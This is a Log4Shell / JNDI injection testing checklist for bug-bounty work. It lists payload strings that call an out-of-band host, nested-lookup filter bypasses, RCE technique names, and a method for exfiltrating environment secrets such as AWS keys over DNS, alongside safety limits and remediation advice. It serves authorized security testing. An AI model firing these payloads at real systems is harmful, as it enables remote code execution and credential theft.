# JNDI Injection / Log4Shell — Testing Checklist

**Author:** x8bitranjit
The finding is an **out-of-band callback from the target's own egress carrying YOUR unique token** — not a reflected
`${jndi:}` or a scanner banner. Stand up your OOB (interactsh/Collaborator) FIRST. One benign proof, then STOP.

## Phase 0 — OOB + recon (§1–§3)
- [ ] OOB host up (interactsh / Burp Collaborator) — DNS + LDAP/RMI capture ready
- [ ] Confirmed the stack is **Java** (error pages, `JSESSIONID`, Spring whitelabel, `.jsp/.do`, `Server` header, app fingerprint)
- [ ] Listed candidate **logged** inputs (headers, params, body, username, filename, path)

## Phase 1 — Detect (blind, OOB-confirmed) (§4–§5)
- [ ] Fired `${jndi:ldap://TOKEN.oob/}` into **every** header (User-Agent, X-Forwarded-For, Referer, Authorization, custom X-*)
- [ ] Fired it into **every** param / JSON value (and key) / login username / filename / path
- [ ] Used a **distinct per-input token** so a callback identifies the exact input
- [ ] Also tried `${jndi:dns://TOKEN.oob/}` (survives egress filtering; stealthiest)
- [ ] **Watched the OOB for a DNS/LDAP hit from the target's egress IP** carrying my token  ← the proof
- [ ] Confirmed the callback is from the **target**, not my resolver / a scanner sandbox (source IP + timing correlated)

## Phase 2 — Bypass (§6–§7)
- [ ] If raw `${jndi:}` blocked → nested-lookup obfuscation (`${lower:}` / `${::-}` / `${env:...:-j}`)
- [ ] Rebuilt `jndi` AND `ldap` from sub-lookups; URL-encoded; split across two headers
- [ ] Switched protocol (`dns://` / `rmi://` / `ldaps://`) to defeat egress rules

## Phase 3 — Impact (§8–§12)
- [ ] Determined JVM state (JDK build pre/post Oct-2018 = `trustURLCodebase`) and Log4j version (§9/§13)
- [ ] (authorized) RCE technique matched: **A** remote-codebase / **B** serialized gadget / **C** BeanFactory-EL bypass
- [ ] (authorized) One **benign** command proven (`id` / `hostname` / unique echo) — no shell, no persistence
- [ ] **Secret exfil** tried where RCE is mitigated: `${env:AWS_SECRET_ACCESS_KEY}` / `${env:DB_PASSWORD}` over DNS
- [ ] SSRF angle noted (JNDI lookup → internal host / cloud metadata → `../SSRF/`)
- [ ] DoS (recursive `${::-}`) only with explicit authorization

## Phase 4 — Product-specific & distinguish (§13–§15)
- [ ] Mapped to the Log4j CVE chain (44228 / 45046 / 45105 / 44832) or a non-Log4j sink
- [ ] Checked other products (H2 console, Logback config, Solr/Druid/Struts, Spring, JDBCAppender)
- [ ] Confirmed it's JNDI injection, **not** LDAP-filter injection / plain deserialization / SpEL / Spring4Shell (§15)

## Phase 5 — Validate → report (§16–§20)
- [ ] Proof = **target-sourced OOB callback with my token** (blind RCE), optionally + one benign command / one `${env}` leak
- [ ] Ruled out the FP list (§16): reflection-only, scanner banner, my-own-resolver, sandbox detonation, empty `${env}`
- [ ] Set **CVSS (10.0 unauth RCE) + CWE-917** (+ CWE-502 for the gadget path) (§17)
- [ ] SAFE-PoC: OOB canary; benign only; **no shells/beacons**; secrets redacted; exploit server torn down (§19)
- [ ] De-duped to **one sink** = one report (list the inputs); led with the confirmed one (§20)

## AUTO-REJECT (don't submit if…)
- [ ] `${jndi:}` merely **reflected** in the response, **no** OOB callback
- [ ] A scanner said "log4j" / a version banner, with **no** callback from the target
- [ ] The DNS hit came from **my** resolver / a CDN / a proxy, not the **target egress**
- [ ] The callback is from an **AV/scanner sandbox** detonating the payload (not the app path)
- [ ] `${env:X}` exfil claimed but the arriving label is **empty** (var not set)
- [ ] A DoS that only crashed my **local** test

## SAFE-PoC (every time)
- [ ] Your **own** OOB host; **per-input tokens**; a target-sourced callback is the proof
- [ ] Escalation (authorized) = **one** benign command or **one** `${env}` leak, then STOP
- [ ] Prefer `dns://` where egress is tight (least intrusive, still conclusive)
- [ ] No reverse shells / persistence on bug-bounty targets; tear down exploit servers
- [ ] Recommend upgrade to Log4j **2.17.1+** / remove `JndiLookup.class` / `trustURLCodebase=false` / egress-filter
